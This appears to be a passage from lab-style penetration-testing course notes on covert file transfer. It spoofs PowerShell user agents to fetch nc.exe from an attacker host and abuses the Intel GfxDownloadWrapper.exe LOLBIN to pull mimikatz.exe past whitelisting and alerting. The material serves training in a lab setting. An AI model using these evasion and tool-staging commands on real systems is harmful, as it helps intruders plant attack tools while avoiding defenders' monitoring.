`Invoke-WebRequest` supports a `-UserAgent` parameter so you can spoof the client string and bypass simple UA blacklists. Set it to a realistic browser string (`Chrome`, `Firefox`, `Internet Explorer`, `Safari`) that matches the environment.

Example: `Invoke-WebRequest -Uri 'http://example.com' -UserAgent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0'`

Use environment-matching strings — an out-of-place UA looks suspicious.
#### Listing out User Agents

```powershell
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent:
#### Request with Chrome User Agent

```powershell
PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
PS C:\htb> Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

```bash
OathBornX@htb[/htb]$ nc -lvnp 80

listening on [any] 80 ...
connect to [10.10.10.32] from (UNKNOWN) [10.10.10.132] 51313
GET /nc.exe HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6
(KHTML, Like Gecko) Chrome/7.0.500.0 Safari/534.6
Host: 10.10.10.32
Connection: Keep-Alive
```

---

## LOLBAS / GTFOBins

Application `whitelisting` can stop `PowerShell` and `netcat`, and `command-line` logging will trip alerts. In that case use a `LOLBIN` (`Living off the Land` binary), also called a “misplaced trust binary.”  
Example: some machines ship the Intel Graphics Driver on `Windows 10` (`GfxDownloadWrapper.exe`), which includes a built-in configuration download feature. This download functionality can be invoked as follows:
#### Transferring File with GfxDownloadWrapper.exe

```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Such a binary may be allowed by `application whitelisting` and excluded from alerts. Check common `LOLBINs` (`Living off the Land` binaries) — they’re the things defenders implicitly trust. For Windows look up `GfxDownloadWrapper.exe` (`Intel Graphics Driver` on `Windows 10`) and other download-capable binaries; for Linux consult `GTFOBins`. The `LOLBAS` Project catalogs more Windows examples. As of writing, `GTFOBins` documents ~40 commonly installed binaries that can be abused for `file transfers`.

